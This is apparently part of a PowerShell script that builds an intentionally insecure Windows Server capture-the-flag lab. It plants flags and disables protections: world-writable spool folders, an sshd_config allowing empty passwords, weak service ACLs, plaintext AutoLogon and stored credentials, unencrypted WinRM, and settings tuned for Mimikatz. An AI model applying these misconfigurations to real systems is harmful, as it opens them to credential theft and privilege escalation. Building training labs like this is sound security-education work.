    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "UpdatePromptSettings" -Value 2 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 0 -PropertyType DWORD -Force
    
    # Create writable spool directory.
    # Field failure: "color has no permissions assigned to Everyone". The
    # color\ directory is owned by NT SERVICE\TrustedInstaller, and the original
    # `icacls ... /T` could fail to apply (locked child color profiles abort the
    # recursive pass, and Administrators may lack WRITE_DAC by inheritance). We
    # therefore (1) take ownership to Administrators, (2) guarantee Administrators
    # WRITE_DAC, then (3) grant Everyone via the well-known SID *S-1-1-0 (locale
    # independent) WITHOUT /T so a single locked child can't abort the grant, and
    # (4) verify the ACE actually landed.
    $spoolPath = "C:\Windows\System32\spool\drivers\color"
    New-Item -Path $spoolPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    takeown /F "$spoolPath" /A 2>$null | Out-Null
    icacls "$spoolPath" /grant "*S-1-5-32-544:(OI)(CI)F" | Out-Null   # Administrators full (ensures WRITE_DAC)
    icacls "$spoolPath" /grant "*S-1-1-0:(OI)(CI)F"       | Out-Null   # Everyone full (the vulnerability)

    if ((icacls "$spoolPath" 2>$null) -match "S-1-1-0|Everyone") {
        Write-Host "  Everyone:(OI)(CI)F applied to spool\drivers\color" -ForegroundColor Green
    } else {
        Write-Host "  WARNING: Everyone ACE did NOT apply to $spoolPath - re-run elevated" -ForegroundColor Red
    }

    # PrintNightmare flag (placed AFTER the grant so it inherits Everyone:F and is
    # readable by a low-priv student).
    $spoolerFlag = New-CTFFlag -Location "Print Spooler Exploit" -Description "PrintNightmare exploitation successful" -Points 45 -Difficulty "Hard" -Technique "PrintNightmare/Print Spooler abuse"
    $spoolerFlag | Out-File "$spoolPath\printnightmare_flag.txt" -Force
    
    # Create vulnerable printer
    Add-PrinterDriver -Name "Generic / Text Only" -ErrorAction SilentlyContinue
    Add-PrinterPort -Name "FILE:" -ErrorAction SilentlyContinue
    Add-Printer -Name "VulnerablePrinter" -DriverName "Generic / Text Only" -PortName "FILE:" -Shared -ShareName "VulnPrinter" -PermissionSDDL "O:BAG:DUD:(A;;LCSWSDRCWDWO;;;WD)" -ErrorAction SilentlyContinue
    
    Write-Host "  Print Spooler vulnerabilities configured with flags" -ForegroundColor Green
}

# Function to install and configure vulnerable SSH
function Configure-VulnerableSSH {
    Write-Host "Installing and configuring vulnerable SSH with flags..." -ForegroundColor Yellow
    
    # Install OpenSSH Server (in-box capability; usually OpenSSH_for_Windows_7.7
    # on RTM Server 2019).
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue | Out-Null

    # OPTIONAL: upgrade to the Win32-OpenSSH 8.1+ GitHub release so the version
    # banner reads "OpenSSH_for_Windows_8.1" as the walkthrough shows. Best-effort;
    # falls back to the in-box build (only the version string differs - the flag
    # lives in the banner regardless).
    if ($UpgradeOpenSSH) {
        try {
            Write-Host "  Upgrading to Win32-OpenSSH 8.1.0.0p1..." -ForegroundColor Gray
            Get-Service sshd -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            $zip = "$env:TEMP\OpenSSH-Win64.zip"
            Invoke-WebRequest -UseBasicParsing -Uri "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v8.1.0.0p1-Beta/OpenSSH-Win64.zip" -OutFile $zip
            Expand-Archive -Path $zip -DestinationPath "C:\Program Files" -Force
            & "C:\Program Files\OpenSSH-Win64\install-sshd.ps1"
            $env:Path = "C:\Program Files\OpenSSH-Win64;$env:Path"
            Write-Host "  OpenSSH 8.1 installed" -ForegroundColor Green
        } catch {
            Write-Host "  OpenSSH upgrade failed ($_); keeping in-box version." -ForegroundColor Yellow
        }
    }

    # Start SSH service
    Start-Service sshd -ErrorAction SilentlyContinue
    Set-Service -Name sshd -StartupType 'Automatic'

    # SSH banner flag
    $sshFlag = New-CTFFlag -Location "SSH Banner" -Description "SSH server banner" -Points 10 -Difficulty "Easy" -Technique "Service enumeration"

    # Resolve the active ProgramData ssh directory (so it also works after the
    # Win32-OpenSSH upgrade, which still uses C:\ProgramData\ssh).
    $sshDir = "C:\ProgramData\ssh"
    New-Item -Path $sshDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    # Configure vulnerable SSH settings with flag in banner.
    # FIX: the original pointed Banner at the Linux path /etc/ssh/banner.txt which
    # does not exist on Windows, so the banner (and flag) never loaded. Windows
    # OpenSSH resolves __PROGRAMDATA__ to C:\ProgramData. We also restore the
    # `Match Group administrators` block so administrators_authorized_keys is
    # honored (FLAG 19).
    $sshdConfig = @"
# Vulnerable SSH Configuration
Port 22
Banner __PROGRAMDATA__/ssh/banner.txt
PasswordAuthentication yes
PermitRootLogin yes
PermitEmptyPasswords yes
MaxAuthTries 100
MaxSessions 10
PubkeyAuthentication yes
StrictModes no
LoginGraceTime 120
X11Forwarding yes
TCPKeepAlive yes
PermitUserEnvironment yes
Compression yes
UsePAM no
Subsystem sftp sftp-server.exe

Match Group administrators
       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
"@

    $sshdConfig | Out-File "$sshDir\sshd_config" -Encoding ascii -Force

    # Create banner with flag. NOTE: SSH sends the Banner directive as a pre-auth
    # SSH_MSG_USERAUTH_BANNER, which an SSH *client* shows before the password
    # prompt -- it is NOT visible to raw `nc`. The walkthrough's Flag 18 retrieval
    # should be `ssh anyuser@<ip>` (see the fix writeup), not netcat.
    "Welcome to Vulnerable SSH Server`n$sshFlag" | Out-File "$sshDir\banner.txt" -Encoding ascii -Force

    # FLAG 19 - SSH key flag. FIX: write to administrators_authorized_keys (the
    # file Windows OpenSSH actually uses for members of the Administrators group)
    # instead of the unused authorized_keys, and apply the strict ACL OpenSSH
    # requires (SYSTEM + Administrators only) so the key is also functional.
    $sshKeyFlag = New-CTFFlag -Location "SSH authorized_keys" -Description "Hidden in SSH authorized_keys" -Points 30 -Difficulty "Medium" -Technique "SSH key enumeration"
    $adminKeys  = "$sshDir\administrators_authorized_keys"
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 overclock@vulnerable # $sshKeyFlag" | Out-File $adminKeys -Encoding ascii -Force
    icacls "$adminKeys" /inheritance:r /grant "*S-1-5-18:(F)" "*S-1-5-32-544:(F)" | Out-Null

    # Restart SSH so the new config + banner take effect
    Restart-Service sshd -ErrorAction SilentlyContinue

    # Open firewall
    New-NetFirewallRule -Name sshd -DisplayName 'SSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction SilentlyContinue | Out-Null

    Write-Host "  SSH server configured with flags" -ForegroundColor Green
}

# Function to create additional vulnerable services
function Create-VulnerableServices {
    Write-Host "Creating additional vulnerable services with flags..." -ForegroundColor Yellow
    
    # Service with weak permissions
    $svcDescFlag = New-CTFFlag -Location "Service Description" -Description "WeakPermService description" -Points 15 -Difficulty "Easy" -Technique "Service enumeration"
    sc.exe create WeakPermService binpath= "C:\Windows\System32\cmd.exe /c echo vulnerable" start= auto
    sc.exe description WeakPermService "Weak Permission Service - $svcDescFlag"
    sc.exe sdset WeakPermService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;WD)"
    
    Write-Host "  Additional vulnerable services created" -ForegroundColor Green
}

# Function to configure scheduled tasks with flags
function Create-VulnerableScheduledTasks {
    Write-Host "Creating vulnerable scheduled tasks with flags..." -ForegroundColor Yellow
    
    # Task flag
    $taskFlag = New-CTFFlag -Location "Scheduled Task" -Description "VulnTask output" -Points 25 -Difficulty "Medium" -Technique "Scheduled task abuse"
    
    # Create task with stored credentials that writes flag
    $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c echo $taskFlag > C:\Public\taskflag.txt"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
    $principal = New-ScheduledTaskPrincipal -UserId "overclock" -LogonType Password -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName "VulnTask" -Action $action -Trigger $trigger -Settings $settings -User "overclock" -Password "Administrator2025!" -ErrorAction SilentlyContinue
    
    Write-Host "  Vulnerable scheduled tasks created with flags" -ForegroundColor Green
}

# Function to create registry flags
function Create-RegistryFlags {
    Write-Host "Creating registry-based flags..." -ForegroundColor Yellow
    
    # Easy flag in HKLM
    $regFlag1 = New-CTFFlag -Location "Registry HKLM" -Description "HKLM:\SOFTWARE\VulnApp" -Points 15 -Difficulty "Easy" -Technique "Registry enumeration"
    New-Item -Path "HKLM:\SOFTWARE\VulnApp" -Force | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\VulnApp" -Name "LicenseKey" -Value $regFlag1 -Force
    
    # Medium flag in HKCU
    $regFlag2 = New-CTFFlag -Location "Registry HKCU" -Description "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Points 25 -Difficulty "Medium" -Technique "Persistence mechanism review"
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterFlag" -Value "cmd /c echo $regFlag2" -Force
    
    # Hard flag in service registry
    $regFlag3 = New-CTFFlag -Location "Registry Service" -Description "Service ImagePath" -Points 35 -Difficulty "Hard" -Technique "Service registry analysis"
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnScanner" -Name "Flag" -Value $regFlag3 -Force
    
    Write-Host "  Registry flags created" -ForegroundColor Green
}

# Function to create web application flags
function Create-VulnerableWebApps {
    Write-Host "Creating vulnerable web applications with flags..." -ForegroundColor Yellow
    
    # Install IIS
    Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole, IIS-WebServer, IIS-CommonHttpFeatures, IIS-HttpErrors, IIS-HttpRedirect, IIS-ApplicationDevelopment, IIS-HealthAndDiagnostics, IIS-HttpLogging, IIS-Security, IIS-RequestFiltering, IIS-Performance, IIS-WebServerManagementTools, IIS-ManagementConsole, IIS-IIS6ManagementCompatibility, IIS-Metabase -All -NoRestart
    
    # Create vulnerable web app
    New-Item -Path "C:\inetpub\wwwroot\vulnapp" -ItemType Directory -Force
    
    # Web flag in HTML comment
    $webFlag1 = New-CTFFlag -Location "Web HTML Comment" -Description "Login page HTML comment" -Points 10 -Difficulty "Easy" -Technique "Web source review"
    
    $vulnPage = @"
<html>
<head><title>Vulnerable App</title></head>
<body>
<h1>Admin Panel</h1>
<!-- TODO: Remove debug info before production -->
<!-- Admin password: $LabPassword -->
<!-- $webFlag1 -->
<form method="GET">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
</form>
</body>
</html>
"@
    $vulnPage | Out-File "C:\inetpub\wwwroot\vulnapp\login.html"

    # FLAG 25 discoverability fix. The original relied on gobuster finding
    # /vulnapp, but "vulnapp" is NOT in dirb's common.txt, so the directory was
    # never discovered. We make it reliably discoverable two ways:
    #   1. Enable directory browsing on the site root and remove the default
    #      document so http://<ip>/ returns a listing that includes vulnapp/.
    #   2. Drop a root landing page that links to /vulnapp/login.html (and names
    #      it in an HTML comment) so a `curl http://<ip>/` reveals the path even
    #      if directory browsing is off.
    $appcmd = "$env:windir\system32\inetsrv\appcmd.exe"
    if (Test-Path $appcmd) {
        & $appcmd set config "Default Web Site" /section:directoryBrowse /enabled:true | Out-Null
        # Clear default documents so the directory listing is served at the root.
        & $appcmd set config "Default Web Site" /section:defaultDocument /enabled:false | Out-Null
    } else {
        try {
            Import-Module WebAdministration -ErrorAction SilentlyContinue
            Set-WebConfigurationProperty -Filter "/system.webServer/directoryBrowse" -Name "enabled" -Value $true -PSPath "IIS:\Sites\Default Web Site" -ErrorAction SilentlyContinue
            Set-WebConfigurationProperty -Filter "/system.webServer/defaultDocument" -Name "enabled" -Value $false -PSPath "IIS:\Sites\Default Web Site" -ErrorAction SilentlyContinue
        } catch { Write-Host "    Warning: could not toggle IIS dirBrowse/defaultDoc: $_" -ForegroundColor Yellow }
    }

    # Remove the stock IIS splash page so it doesn't mask the listing.
    Remove-Item "C:\inetpub\wwwroot\iisstart.htm"  -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\inetpub\wwwroot\iisstart.png"  -Force -ErrorAction SilentlyContinue

    # Root landing page that points at the app (belt-and-suspenders discovery).
    @"
<html>
<head><title>Internal Web Portal</title></head>
<body>
<h1>Internal Web Portal</h1>
<!-- Application moved to /vulnapp/ -->
<ul>
  <li><a href="/vulnapp/login.html">Application Login</a></li>
</ul>
</body>
</html>
"@ | Out-File "C:\inetpub\wwwroot\index.html" -Encoding ascii -Force

    iisreset /restart 2>$null | Out-Null

    Write-Host "  Web applications created with flags (root listing + landing page enabled)" -ForegroundColor Green
}

# Function to enable legacy protocols
function Enable-LegacyProtocols {
    Write-Host "Enabling legacy protocols..." -ForegroundColor Yellow
    
    # Enable LLMNR
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast -Value 1 -ErrorAction SilentlyContinue
    
    # Enable NetBIOS
    $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=true"
    foreach ($adapter in $adapters) {
        $adapter.SetTcpipNetbios(1) | Out-Null
    }
    
    Write-Host "  Legacy protocols enabled" -ForegroundColor Green
}

# Function to generate flag documentation
function Generate-FlagReport {
    Write-Host "`nGenerating flag report..." -ForegroundColor Cyan
    
    $reportPath = "C:\CTF_FLAGS_SERVER_v5_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
    
    $html = @"
<!DOCTYPE html>
<html>
<head>
    <title>CTF Flag Report - Server v5 - $(hostname)</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #f0f0f0; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
        h1 { color: #333; border-bottom: 3px solid #007acc; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #007acc; color: white; padding: 12px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #ddd; }
        tr:hover { background: #f5f5f5; }
        .easy { color: green; font-weight: bold; }
        .medium { color: orange; font-weight: bold; }
        .hard { color: red; font-weight: bold; }
        .stats { background: #e7f4ff; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .flag-code { font-family: 'Courier New'; background: #f0f0f0; padding: 2px 5px; border-radius: 3px; }
        .pokemon-theme { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .new-vulns { background: #d4edda; border-left: 5px solid #28a745; padding: 10px; margin: 20px 0; }
        .mimikatz { background: #fff3cd; border-left: 5px solid #ffc107; padding: 10px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="pokemon-theme">
            <h1 style="color: white; border: none;">CTF Flag Report v5 - Windows Server 2019 </h1>
        </div>
        <div class="stats">
            <h2>Statistics</h2>
            <p><strong>Total Flags:</strong> $($global:FlagList.Count)</p>
            <p><strong>Easy Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Easy'}).Count)</p>
            <p><strong>Medium Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Medium'}).Count)</p>
            <p><strong>Hard Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Hard'}).Count)</p>
            <p><strong>Report Generated:</strong> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</p>
        </div>
        
        <h2>Flag Details</h2>
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Flag</th>
                    <th>Location</th>
                    <th>Description</th>
                    <th>Difficulty</th>
                    <th>Technique</th>
                </tr>
            </thead>
            <tbody>
"@
    
    foreach ($flag in $global:FlagList | Sort-Object FlagID) {
        $difficultyClass = $flag.Difficulty.ToLower()
        $html += @"
                <tr>
                    <td>$($flag.FlagID)</td>
                    <td class="flag-code">$($flag.Flag)</td>
                    <td>$($flag.Location)</td>
                    <td>$($flag.Description)</td>
                    <td class="$difficultyClass">$($flag.Difficulty)</td>
                    <td>$($flag.Technique)</td>
                </tr>
"@
    }
    
    $html += @"
            </tbody>
        </table>
    </div>
</body>
</html>
"@
    
    $html | Out-File $reportPath -Encoding UTF8
    
    # Also create a CSV for easier parsing
    $csvPath = $reportPath -replace '\.html$', '.csv'
    $global:FlagList | Export-Csv -Path $csvPath -NoTypeInformation
    
    # Create a simple text file with just the flags
    $flagsOnlyPath = $reportPath -replace '\.html$', '_flags_only.txt'
    $global:FlagList | ForEach-Object { $_.Flag } | Out-File $flagsOnlyPath -Encoding UTF8
    
    Write-Host "  Flag report saved to: $reportPath" -ForegroundColor Green
    Write-Host "  CSV report saved to: $csvPath" -ForegroundColor Green
    Write-Host "  Flags only file saved to: $flagsOnlyPath" -ForegroundColor Green
    
    return $reportPath
}

# Main execution
Write-Host "`nStarting vulnerable server configuration v5 ..." -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

# Run all configurations
Create-WeakUsers
Disable-SecurityFeatures
Configure-MimikatzVulnerabilities
Configure-DebugPrivileges
Configure-PassTheHash
Configure-VulnerableRDP
Configure-VulnerableSMB
Create-UnquotedServicePaths
Configure-AlwaysInstallElevated
Configure-PrintSpoolerVulnerabilities
Configure-VulnerableSSH
Create-VulnerableServices
Create-VulnerableScheduledTasks
Create-RegistryFlags
Create-VulnerableWebApps
Enable-LegacyProtocols

# Additional misconfigurations
Write-Host "`nApplying additional misconfigurations..." -ForegroundColor Yellow

# AutoLogon
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value "overclock"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Value "Administrator2025!"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Value 1

# Store credentials
cmdkey /add:DC01 /user:Administrator /pass:$LabPassword
cmdkey /add:FileServer /user:overclock /pass:Administrator2025!

# Enable PowerShell remoting without authentication
Enable-PSRemoting -Force -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true -ErrorAction SilentlyContinue
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true -ErrorAction SilentlyContinue

# Generate reports if requested
if ($GenerateFlagReport) {
    $reportPath = Generate-FlagReport
}

Write-Host "`n========================================" -ForegroundColor Green
Write-Host "Server vulnerability configuration v5 complete!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "MIMIKATZ-FRIENDLY FEATURES:" -ForegroundColor Cyan
Write-Host "  WDigest enabled (plaintext passwords in memory)" -ForegroundColor Yellow
Write-Host "  LSA Protection disabled" -ForegroundColor Yellow
Write-Host "  Debug privileges granted to users" -ForegroundColor Yellow
Write-Host "  Pass-the-Hash enabled (NTLM)" -ForegroundColor Yellow
Write-Host "  Credential Guard disabled" -ForegroundColor Yellow
Write-Host ""
Write-Host "OTHER VULNERABILITIES:" -ForegroundColor Cyan
Write-Host "  Unquoted Service Paths (3 services)" -ForegroundColor Yellow
Write-Host "  AlwaysInstallElevated MSI" -ForegroundColor Yellow
Write-Host "  Print Spooler (PrintNightmare)" -ForegroundColor Yellow
Write-Host ""
Write-Host "FLAG STATISTICS:" -ForegroundColor Cyan
Write-Host "  Total Flags Placed: $($global:FlagList.Count)" -ForegroundColor Yellow
Write-Host ""
Write-Host "Users for Mimikatz testing:" -ForegroundColor Cyan
Write-Host "  Administrator: $LabPassword" -ForegroundColor Yellow
Write-Host "  overclock: Administrator2025!" -ForegroundColor Yellow
Write-Host "  backup: Backupaccount123!" -ForegroundColor Yellow
Write-Host "  debugger: Debugger2025! (has debug privs)" -ForegroundColor Yellow
Write-Host ""
if ($GenerateFlagReport) {
    Write-Host "Flag reports generated!" -ForegroundColor Green
}
Write-Host ""
Write-Host "REMINDER: This server is now EXTREMELY VULNERABLE!" -ForegroundColor Red
Write-Host "Optimized for Mimikatz credential extraction!" -ForegroundColor Red
Write-Host ""
Write-Host "Please restart the server to ensure all changes take effect." -ForegroundColor Cyan
